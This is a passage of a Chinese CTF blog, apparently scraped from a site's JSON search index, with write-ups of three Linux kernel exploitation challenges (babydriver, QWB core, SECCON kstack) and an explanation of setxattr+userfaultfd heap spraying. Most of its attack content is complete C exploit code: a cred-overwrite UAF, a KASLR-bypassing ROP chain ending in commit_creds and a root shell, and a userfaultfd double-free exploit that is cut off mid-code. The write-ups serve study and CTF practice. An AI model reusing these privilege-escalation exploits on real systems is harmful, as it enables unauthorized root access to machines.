ls                                                 bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr\n\n接下来查看init文件\n~/download/study_kernel/core cat ./init -n                                          1\t#!/bin/sh     2\t      3\tmount -t proc none /proc     4\tmount -t sysfs none /sys     5\tmount -t devtmpfs devtmpfs /dev     6\tchown root:root flag     7\tchmod 400 flag     8\texec 0&lt;/dev/console     9\texec 1&gt;/dev/console    10\texec 2&gt;/dev/console    11\t    12\tinsmod /lib/modules/4.4.72/babydriver.ko    13\tchmod 777 /dev/babydev    14\techo -e &quot;\\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\\n&quot;    15\tsetsid cttyhack setuidgid 1000 sh    16\t    17\tumount /proc    18\tumount /sys    19\tpoweroff -d 0  -f    20\n\n可以看到在12行的时候加入一个驱动文件，一般这就是漏洞LKM。拿到驱动文件开始分析\n分析代码\n首先可以看到除了堆栈不可执行其余保护都是没开的\n\n首先在ida可以看到这一结构体\n再看babyioctl函数：\n__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)&#123;  size_t v3; // rdx  size_t v4; // rbx  _fentry__(filp, command, arg);  v4 = v3;  if ( command == 0x10001 )  &#123;    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);    babydev_struct.device_buf_len = v4;    printk(&quot;alloc done\\n&quot;, 0x24000C0LL);    return 0LL;  &#125;  else  &#123;    printk(&amp;unk_2EB, v3);    return -22LL;  &#125;&#125;\n\n可以看到，这里在command为0x10001时，会先free掉以前的chunk，随后malloc一个我们给他的size的chunk。\nbabyopen:\nint __fastcall babyopen(inode *inode, file *filp)&#123;  _fentry__(inode, filp);  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 64LL;  printk(&quot;device open\\n&quot;, 0x24000C0LL);  return 0;&#125;\n\n这里就会生成一个size为0x40的chunk\nbabyrelease:\nint __fastcall babyrelease(inode *inode, file *filp)&#123;  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\\n&quot;, filp);  return 0;&#125;\n\n这里会释放掉结构体所储存的chunk指针。\nbabyread:\nssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &gt; v4 )  &#123;    v6 = v4;    copy_to_user(buffer);    return v6;  &#125;  return result;&#125;\n\n这里就是如果我们传入的size小于储存的size即可实行copy_to_user。\nbabywrite:\nssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &gt; v4 )  &#123;    v6 = v4;    copy_from_user();    return v6;  &#125;  return result;&#125;\n\n这里和上面的验证一样。\n解题思路这里可以看到不存在任何溢出，但是这里跟传统用户态不同的是这里的全局变量是整个系统中全局的。那意思就是这里是存在UAF漏洞的。\n所以基本思路就是：\n 1. 首先打开两次设备，更改chunk size为cred结构体的size\n 2. 释放其中一个，这时就会出现0xa8的空白，那么我们fork一个新的进程，就会让进程的cred结构体占据那一空间\n 3. 我们还可以通过另一文件描述符修改掉内部的值，提权到root\n\n综上得出exp：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;// #include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main()&#123;    int fd1 = open(&quot;/dev/babydev&quot;, 2);    int fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8);    close(fd1);    int pid = fork();    if (pid &lt; 0)    &#123;        puts(&quot;[*] error!&quot;);        exit(0);    &#125;    else if (pid == 0)    &#123;        char payload[30] = &#123;0&#125;;        write(fd2, payload, sizeof(payload));        if (getuid() == 0)        &#123;            puts(&quot;[+] root now!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        &#125;    &#125;    else    &#123;        wait(NULL);    &#125;    close(fd2);&#125;\n\n最后使用gcc静态编译打包进文件系统就好了\ngcc exploit.c -static -o exploitcp exploit core/tmp find . | cpio -o --format=newc &gt; rootfs.cpiocp rootfs.cpio ..\n\n2018 强网杯 - core这道题目的文件多了一个vmlinux，是未经过压缩的kernel文件，不过根据我的实践发现不能直接在题目给的vmlinux提取gedget，可以通过extract-vmlinux提取vmlinux来获取再用Ropper来提取。\n一样的先看一下start.sh\ntcdy@arch-linux ~/Downloads/study_kernel % cat -n start.sh      1\tqemu-system-x86_64 \\     2\t-m 256M \\     3\t-kernel ./bzImage \\     4\t-initrd  ./core.cpio \\     5\t-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\     6\t-s  \\     7\t-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\     8\t-nographic  \\\n\n可以看到在第五行里面开启了kaslr，这一保护类似与aslr，需要泄漏地址才能获取gadget的地址。\n再看一下init文件\ntcdy@arch-linux ~/Downloads/study_kernel/core % cat -n init      1\t#!/bin/sh     2\tmount -t proc proc /proc     3\tmount -t sysfs sysfs /sys     4\tmount -t devtmpfs none /dev     5\t/sbin/mdev -s     6\tmkdir -p /dev/pts     7\tmount -vt devpts -o gid=4,mode=620 none /dev/pts     8\tchmod 666 /dev/ptmx     9\tcat /proc/kallsyms &gt; /tmp/kallsyms    10\techo 1 &gt; /proc/sys/kernel/kptr_restrict    11\techo 1 &gt; /proc/sys/kernel/dmesg_restrict    12\tifconfig eth0 up    13\tudhcpc -i eth0    14\tifconfig eth0 10.0.2.15 netmask 255.255.255.0    15\troute add default gw 10.0.2.2     16\tinsmod /core.ko    17\t    18\t#poweroff -d 120 -f &amp;    19\tsetsid /bin/cttyhack setuidgid 1000 /bin/sh    20\techo &#x27;sh end!\\n&#x27;    21\tumount /proc    22\tumount /sys    23\t    24\tpoweroff -d 0  -f\n\n可以看到第9行里面，系统将/proc/kallsyms放到了/tmp目录，然后又将kptr_restrict和dmesg_restrict设置为1，就不能通过/proc/kallsyms查看函数地址，以及用dmesg来查看kernel信息了。\n随后看一下驱动文件的保护：\n\n(这篇文章居然跟着我换个系统，哈哈哈哈哈！)\n分析驱动__int64 init_module()&#123;  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&quot;\\x016core: created /proc/core entry\\n&quot;);  return 0LL;&#125;\n\n看一下可以看到注册到了/proc/core\n__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)&#123;  switch ( a2 )  &#123;    case 0x6677889B:      core_read(a3);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = a3;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(a3);      break;  &#125;  return 0LL;&#125;\n\ncore_ioctl函数可以看到十三个选项，分别看一下\nunsigned __int64 __fastcall core_read(__int64 a1)&#123;  char *v2; // rdi  __int64 i; // rcx  unsigned __int64 result; // rax  char v5[64]; // [rsp+0h] [rbp-50h] BYREF  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = v5;  for ( i = 16LL; i; --i )  &#123;    *v2 = 0;    v2 += 4;  &#125;  strcpy(v5, &quot;Welcome to the QWB CTF challenge.\\n&quot;);  result = copy_to_user(a1, &amp;v5[off], 64LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm &#123; swapgs &#125;  return result;&#125;\n\n第一个core_read在最后做了一件事，就是吧v5[off]的值给到了我们的a1，然而这里的a1又是上一级a3，所以我们使用ioctl函数的第三个参数可以接收到这一值\ncase 0x6677889C:      printk(&amp;unk_2CD);      off = a3;      break;\n\n这里第二个选项可以看到我们还可以随意的修改off，所以我们可以这一方式泄漏出一些值，比如canary\n__int64 __fastcall core_copy_func(__int64 a1)&#123;  __int64 result; // rax  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF  v2[8] = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( a1 &gt; 63 )  &#123;    printk(&amp;unk_2A1);    return 0xFFFFFFFFLL;  &#125;  else  &#123;    result = 0LL;    qmemcpy(v2, &amp;name, (unsigned __int16)a1);  &#125;  return result;&#125;\n\n然后第三个选项里可以看到将name全局变量复制到v2里，并且可以看到在获取参数时的数据类型为int64但是在qmemcpy函数内使用的却是unsigned int16，如果我们传入的是0xffffffffffff0100就可以造成栈溢出。\n__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  printk(&amp;unk_215);  if ( a3 &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, a2, a3) )    return (unsigned int)a3;  printk(&amp;unk_230);  return 4294967282LL;&#125;\n\n并且在write函数我们还可以控制全局变量name的内容。\n解题思路 1. 通过设置off，使用core_read()泄漏出canary\n 2. 通过core_write()修改name的值，构造rop链\n 3. 通过core_copy_func()实现栈溢出，进行rop\n 4. 返回用户态通过system(&quot;/bin/sh&quot;);获得root shell\n\n在这里需要注意的是在进入内核之前会保存用户态的各种寄存器，所以在最后还要恢复各种寄存器。这里看一下push保存寄存器的操作：\npushq  $__USER_DS      /* pt_regs-&gt;ss */pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */pushq  %r11             /* pt_regs-&gt;flags */pushq  $__USER_CS      /* pt_regs-&gt;cs */pushq  %rcx             /* pt_regs-&gt;ip */\n\n由于我们会进行ROP，在结束时rsp的值会变动，所以我们就需要自己构造一些值来保证能够正常恢复到用户态。\nvoid save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;\n\n可以看到上面只有四个被保存了，因为最后我们希望rip跳转到system(“/bin/sh”);的地址，所以我们只需要好好构造好栈数据即可。\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;size_t raw_vmlinux_base = 0xffffffff81000000;size_t commit_creds = 0, prepare_kernel_cred = 0, vmlinux_base = 0;void find_symbols()&#123;    FILE *file = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (file &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while (fgets(buf, 0x30, file))    &#123;        if (commit_creds &amp; prepare_kernel_cred)            return;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if (!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;void get_root()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    ioctl(fd, 0x6677889C, 0x40);    char buf[0x30] = &#123;0&#125;;    ioctl(fd, 0x6677889B, buf);    size_t canary = ((size_t *)buf)[0];    size_t payload[0x1000] = &#123;0&#125;;    int i;    for (i = 0; i &lt; 10; i++)    &#123;        payload[i] = canary;    &#125;    payload[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret;    payload[i++] = 0;    payload[i++] = prepare_kernel_cred;    payload[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret;    payload[i++] = commit_creds;    payload[i++] = 0xffffffff8106a6d2 + offset; // mov rdi, rax; jmp rdx;    payload[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;    payload[i++] = (size_t)get_root;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    write(fd, payload, 0x800);    ioctl(fd, 0x6677889A, 0xffffffffffff0100);&#125;\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; retrop[i++] = 0;rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; retrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; retrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; rop[i++] = commit_creds;rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; retrop[i++] = 0;rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; rop[i++] = (size_t)spawn_shell;         // rip rop[i++] = user_cs;rop[i++] = user_rflags;rop[i++] = user_sp;rop[i++] = user_ss;\n\n这里是wiki上的payload片段，但是我有点不明白的是这里为什么要把mov rdi, rax; call rdx;的地址放到rcx里，并且这里不应该使用call rdx，如果是使用了call的话就会导致在结束是ret回来的地址就是gadget后面紧随的地址了，这也就导致swapgs以及后续rop chain无法执行，所以这里应该用jmp来代替(我也是在动态调试中发现的)。\n其次\n\n这里可以看到是可以泄漏出core_ioctl的地址的，所以我们可以不是用/tmp/kallsyms来获取地址。\nraw_vmlinux_base的由来：\ntcdy@arch-linux ~/Downloads/study_kernel % objdump -h test test:     file format elf64-x86-64Sections:Idx Name          Size      VMA               LMA               File off  Algn  0 .text         00c0325d  ffffffff81000000  0000000001000000  00200000  2**12                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n\ncommit_creds偏移的由来：\n&gt;&gt;&gt; hex(ELF(&quot;./core/vmlinux&quot;).symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000)&#x27;0x9c8e0&#x27;\n\n\n参考文章https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#get-root-shell\n","categories":["Linux Kernel"],"tags":["kernel UAF","kernel ROP"]},{"title":"kernel堆占位","url":"/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/","content":"关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 https://cv196082.gitee.io/2022/08/16/userfaultfd/ \nsetxattrsetxattr这个系统调用是非常独特的，在kernel的利用中他可以为我们提供几乎任意大小的object分配。\nsetxattr的调用链如下：\nSYS_setxattr()=&gt;path_setxattr()=&gt;setxattr()\nstatic long  setxattr(struct user_namespace *mnt_userns, struct dentry *d,           const char __user *name, const void __user *value, size_t size,           int flags)&#123;  int error;  void *kvalue = NULL;  char kname[XATTR_NAME_MAX + 1];  if (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))    return -EINVAL;  error = strncpy_from_user(kname, name, sizeof(kname));  if (error == 0 || error == sizeof(kname))    error = -ERANGE;  if (error &lt; 0)    return error;  if (size) &#123;    if (size &gt; XATTR_SIZE_MAX)      return -E2BIG;    kvalue = kvmalloc(size, GFP_KERNEL);    if (!kvalue)      return -ENOMEM;    if (copy_from_user(kvalue, value, size)) &#123;      error = -EFAULT;      goto out;    &#125;    if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||        (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))      posix_acl_fix_xattr_from_user(mnt_userns, d_inode(d),                                    kvalue, size);  &#125;  error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);  out:  kvfree(kvalue);  return error;&#125;\n\n我发现linux5.19版本里的setxattr函数的代码发生了变化，对于新版本的利用我还了解到比较少这里就不展开说了。可以看到上述代码中可以直接进行kvmalloc之后copy_from_user并且size和value都是我门可控的但是最后会free掉object。\nsetxattr &amp; userfaultfd虽然我们可控一个object的内容，但是最后始终会free掉导致我们前功尽弃了。但是看过上一篇文章可以注意到在函数中会调用到copy_from_user从用户空间拷贝数据。那么我们可以产生下述想法：\n我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd 监视，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用：\n\n上述就是 setxattr + userfaultfd的堆占位技术\n例题：SECCON 2020 kstack题目分析题目开启保护有：smep，KPTI，kaslr\n并且题目给的驱动模块只有一个ioctl函数可供利用。\nv4 = *(_DWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 860);v8 = kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL); // size:0x20*(_DWORD *)v8 = v4;v9 = head;head = v8;*(_QWORD *)(v8 + 16) = v9;if ( !copy_from_user(v8 + 8, v3, 8LL) )  return 0LL;head = *(_QWORD *)(v8 + 16);kfree(v8);return -22LL;\n\n这里分配使用了kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL);，第二个参数是 flag ，为常规的 GFP_KERNEL这里可以暂且忽略。主要关注的是第一个参数，内核中有一个数组kmalloc_caches存放着kmalloc_cache\nconst struct kmalloc_info_struct kmalloc_info[] __initconst = &#123;\tINIT_KMALLOC_INFO(0, 0),\tINIT_KMALLOC_INFO(96, 96),\tINIT_KMALLOC_INFO(192, 192),\tINIT_KMALLOC_INFO(8, 8),\tINIT_KMALLOC_INFO(16, 16),\tINIT_KMALLOC_INFO(32, 32),\tINIT_KMALLOC_INFO(64, 64),\tINIT_KMALLOC_INFO(128, 128),\tINIT_KMALLOC_INFO(256, 256),\tINIT_KMALLOC_INFO(512, 512),\tINIT_KMALLOC_INFO(1024, 1k),\tINIT_KMALLOC_INFO(2048, 2k),\tINIT_KMALLOC_INFO(4096, 4k),\tINIT_KMALLOC_INFO(8192, 8k),\tINIT_KMALLOC_INFO(16384, 16k),\tINIT_KMALLOC_INFO(32768, 32k),\tINIT_KMALLOC_INFO(65536, 64k),\tINIT_KMALLOC_INFO(131072, 128k),\tINIT_KMALLOC_INFO(262144, 256k),\tINIT_KMALLOC_INFO(524288, 512k),\tINIT_KMALLOC_INFO(1048576, 1M),\tINIT_KMALLOC_INFO(2097152, 2M),\tINIT_KMALLOC_INFO(4194304, 4M),\tINIT_KMALLOC_INFO(8388608, 8M),\tINIT_KMALLOC_INFO(16777216, 16M),\tINIT_KMALLOC_INFO(33554432, 32M)&#125;;\n\n可以看到kmem_caches[5]对应的大小也就是32。然后这里object的前四个字节存放的内容为线程组的id。那么可以推测出结构体：\nstruct node&#123;  long int id;  char data[8];  struct node *prev;&#125;;\n\nv4 = *(_DWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 860);if ( a2 != 0x57AC0001 )&#123;  if ( a2 != 0x57AC0002 )    return 0LL;  v5 = head;  if ( !head )    return 0LL;  if ( v4 == LODWORD(head-&gt;id) )  &#123;    if ( !copy_to_user(a3, &amp;head-&gt;data, 8LL) )    &#123;      v6 = v5;      head = (struct node *)v5-&gt;prev;      goto LABEL_12;    &#125;  &#125;  else  &#123;    v6 = (struct node *)head-&gt;prev;    if ( v6 )    &#123;      while ( LODWORD(v6-&gt;id) != v4 )      &#123;        v5 = v6;        if ( !v6-&gt;prev )          return -22LL;        v6 = (struct node *)v6-&gt;prev;      &#125;      if ( !copy_to_user(a3, &amp;v6-&gt;data, 8LL) )      &#123;        v5-&gt;prev = v6-&gt;prev;        LABEL_12:        kfree(v6);        return 0LL;      &#125;    &#125;  &#125;  return -22LL;&#125;\n\n然后就是上面这个功能，这里首先判断id是否等于当前进程的id如果是则取出数据，若果不是则开始进行循环查找，找到是当前进程id的object再读取数据。在读取出数据之后会进行脱链然后进行free操作。\n利用过程可以注意到上述代码中都没有锁的操作，所以这也为userfaultfd提供了可能性。\nleak这里只可以读取object+8位置处的数据，这里选择的结构体为： shm_file_data\nstruct shm_file_data &#123;    int id;    struct ipc_namespace *ns;    struct file *file;    const struct vm_operations_struct *vm_ops;&#125;;\n\n这里ns位置存放的是kernel的.text段的地址。所以正好是可以泄漏出kernel地址。这里使用的办法就是先创建一个shm结构体随后释放掉，然后我们利用驱动申请一个object，使用userfaultfd阻止我们的数据写入到object中，然后在同一个线程读取出来内容。\nattack后续的利用需要使用到double free，这里的double free不知道为什么是可以直接进行的不需要中间隔一个object，所以有清楚的师傅希望可以在评论区告诉我一下。最后就是使用seq_operations和setxattr进行劫持。在最后会用到堆占位的技术，即我们在setxattr中的copy_from_user时，我们只需要将前面0x8个字节的内容复制到seq_operations中，那么后续使用pt_regs进行稳定的拿到root shell。\n对于pt_regs有疑问的可以看一下我前面文章中 0CTF 2021 final kernote 这道题的做法。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/xattr.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;sys/shm.h&gt;#include &lt;poll.h&gt;unsigned long *kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;unsigned long *seq_fd_reserve[0x100];int fd;int seq_fd;void create(unsigned long *buf)&#123;    ioctl(fd, 0x57AC0001, buf);&#125;void delete (unsigned long *buf)&#123;    ioctl(fd, 0x57AC0002, buf);&#125;void ErrExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, unsigned long len, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page;    ur.range.len = len;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1)        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        ErrExit(&quot;[-] pthread_create&quot;);&#125;void *leak_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] leak handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] leak handler unblocked&quot;);    // pause();    delete (&amp;kernel_addr);    printf(&quot;[*]leak ptr:%p\\n&quot;, kernel_addr);    kernel_base = kernel_addr - 0x186f78;    kernel_offset = kernel_base - 0xffffffff81000000;    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] leak handler done&quot;);    return NULL;&#125;void *double_free_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] double free handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] double free handler unblocked&quot;);    // pause();    char *tmp = malloc(0x100);    delete (tmp);    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] double free handler done&quot;);    return NULL;&#125;unsigned long pop_rdi;unsigned long swapgs_restore_regs_and_return_to_usermode;unsigned long commit_creds;unsigned long init_cred;unsigned long prepare_kernel_cred;unsigned long mov_rdi_rax_pop_rbp_ret;void *getroot_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] getroot handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] getroot handler unblocked&quot;);    puts(&quot;[*] setxattr trapped in userfaultfd.&quot;);    for (int i = 0; i &lt; 100; i++)        close(seq_fd_reserve[i]);    // pause();    pop_rdi = 0xffffffff81034505 + kernel_offset;    commit_creds = 0xffffffff81069c10 + kernel_offset;    swapgs_restore_regs_and_return_to_usermode = 0xffffffff81600a34 + kernel_offset + 0x10;    prepare_kernel_cred = 0xffffffff81069e00 + kernel_offset;    mov_rdi_rax_pop_rbp_ret = 0xffffffff8121f89a + kernel_offset;    __asm__(        &quot;mov r15,   0xbeefdead\\n&quot;        &quot;mov r14,   0xbeefdead\\n&quot;        &quot;mov r13,   pop_rdi\\n&quot;        &quot;mov r12,   0\\n&quot;        &quot;mov rbp,   prepare_kernel_cred\\n&quot;        &quot;mov rbx,   mov_rdi_rax_pop_rbp_ret\\n&quot;        &quot;mov r11,   0xbeefdead\\n&quot;        &quot;mov r10,   commit_creds\\n&quot;        &quot;mov r9,    swapgs_restore_regs_and_return_to_usermode\\n&quot;        &quot;mov r8,    0xbeefdead\\n&quot;        &quot;xor rax,   rax\\n&quot;        &quot;mov rcx,   0xbeefdead\\n&quot;        &quot;mov rdx,   8\\n&quot;        &quot;mov rsi,   rsp\\n&quot;        &quot;mov rdi,   seq_fd\\n&quot;        &quot;syscall&quot;);    puts(&quot;[*] execve root shell now...&quot;);    system(&quot;/bin/sh&quot;);    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] getroot handler done&quot;);    return NULL;&#125;int main()&#123;    fd = open(&quot;/proc/stack&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[-] Error opening /proc/stack\\n&quot;);        exit(-1);    &#125;    unsigned long *buf = malloc(0x4000);    unsigned long *leak_buf;    int shm_id;    unsigned long *shm_addr;    unsigned long *double_free_buf;    char *getroot_buf;    memset(buf, &#x27;a&#x27;, 0x1000);    for (int i = 0; i &lt; 100; i++)    &#123;        if 